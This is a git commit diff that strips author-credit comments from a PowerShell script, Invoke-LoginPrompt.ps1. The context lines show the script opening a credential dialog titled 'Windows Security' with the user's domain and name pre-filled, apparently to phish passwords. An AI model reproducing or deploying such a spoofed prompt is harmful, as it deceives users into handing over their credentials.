5cfe0421beee2f0225af01830599962f4b4a940f
Matt Nelson <enigma0x3@users.noreply.github.com>
2016-03-14 19:40:50 -0400

    Update Invoke-LoginPrompt.ps1

--- Invoke-LoginPrompt.ps1
+++ Invoke-LoginPrompt.ps1
@@ -1,6 +1,3 @@
-#Coded by Matt N.
-#Twitter: @enigma0x3
-#Blog: www.enigma0x3.wordpress.com
 function Invoke-LoginPrompt{
 $cred = $Host.ui.PromptForCredential("Windows Security", "Please enter user credentials", "$env:userdomain\$env:username","")
 $username = "$env:username"
